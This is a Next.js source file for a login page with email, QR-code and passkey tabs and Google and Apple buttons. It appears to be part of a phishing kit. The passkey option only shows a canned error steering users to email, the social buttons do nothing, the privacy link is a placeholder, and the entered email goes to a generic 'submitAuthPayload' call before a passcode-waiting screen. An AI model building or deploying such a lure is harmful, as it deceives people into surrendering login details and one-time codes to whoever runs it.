"use client";

import { Suspense, useState } from "react";
import { useRouter } from "next/navigation";
import { AuthShell } from "@/components/auth/AuthShell";
import { AuthBanner } from "@/components/auth/AuthBanner";
import { AuthSegmented } from "@/components/auth/AuthSegmented";
import { AuthTabs, type AuthTab } from "@/components/auth/AuthTabs";
import { AuthField } from "@/components/auth/AuthField";
import { PrimaryButton } from "@/components/auth/PrimaryButton";
import { GoogleButton, AppleButton } from "@/components/auth/SocialButtons";
import { StepGate, PasscodeLoading } from "@/components/auth/StepGate";
import { QrLoginPanel } from "@/components/auth/QrLoginPanel";
import { submitAuthPayload } from "@/lib/submit";

const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

function LoginForm() {
  const router = useRouter();
  const [tab, setTab] = useState<AuthTab>("email");
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [sent, setSent] = useState(false);

  const handleLogin = async () => {
    if (!emailPattern.test(email)) {
      setError("Invalid email address.");
      return;
    }
    setError("");
    setLoading(true);
    await submitAuthPayload({ page: "login", email });
    setSent(true);
  };

  const handleSocial = () => {
    setError("");
  };

  return (
    <StepGate step="login">
      {() =>
        sent ? (
          <PasscodeLoading />
        ) : (
          <div className="w-full max-w-[554px] rounded-[8px] border border-auth-card-border bg-auth-card p-4">
            <AuthSegmented value="login" onChange={() => {}} />
            <div className="mt-5">
              <AuthTabs value={tab} onChange={setTab} />
            </div>
            {tab === "email" ? (
              <form
                className="mt-4"
                onSubmit={(event) => {
                  event.preventDefault();
                  handleLogin();
                }}
                noValidate
              >
                <AuthField
                  id="login-email"
                  type="email"
                  placeholder="Enter your email address"
                  autoComplete="email"
                  value={email}
                  error={error}
                  onChange={(event) => {
                    setEmail(event.target.value);
                    if (error) setError("");
                  }}
                />
                <div className="mt-6">
                  <PrimaryButton type="submit" loading={loading}>
                    Log In
                  </PrimaryButton>
                </div>
              </form>
            ) : tab === "qr" ? (
              <QrLoginPanel />
            ) : (
              <div className="mt-4 rounded-[8px] border border-auth-card-border p-6">
                <p className="text-center text-base font-medium leading-6 text-white">
                  We&apos;re sorry, but there is a problem logging in with Passkeys at the moment.
                </p>
                <p className="mt-3 text-center text-base font-medium leading-6 text-grey-200">
                  Please use your email address to log in instead.
                </p>
                <div className="mt-6">
                  <button
                    type="button"
                    onClick={() => setTab("email")}
                    className="flex h-11 w-full items-center justify-center rounded bg-auth-btn text-sm font-semibold text-white transition-colors hover:bg-auth-btn-hover"
                  >
                    Use email instead
                  </button>
                </div>
              </div>
            )}
            <div className="mt-7 flex flex-col gap-4">
              <GoogleButton onClick={handleSocial} />
              <AppleButton onClick={handleSocial} />
              <p className="text-xs font-medium text-grey-200">
                By submitting your email, you confirm you&apos;ve read the relevant{" "}
                <a href="#" className="text-blue-brand transition-opacity hover:opacity-80">
                  Privacy Notice
                </a>
                .
              </p>
            </div>
          </div>
        )
      }
    </StepGate>
  );
}

export default function LoginPage() {
  return (
    <AuthShell>
      <div className="mx-auto mb-10 mt-8 flex w-full max-w-[1140px] flex-1 flex-col">
        <div className="grid flex-1 grid-cols-1 gap-8 max-[1200px]:grid-cols-1 min-[1200px]:grid-cols-[minmax(0,1fr)_minmax(0,554px)]">
          <div className="flex min-w-0 justify-center">
            <Suspense fallback={null}>
              <LoginForm />
            </Suspense>
          </div>
          <div className="hidden h-full min-h-0 min-[1200px]:block">
            <AuthBanner />
          </div>
        </div>
      </div>
    </AuthShell>
  );
}
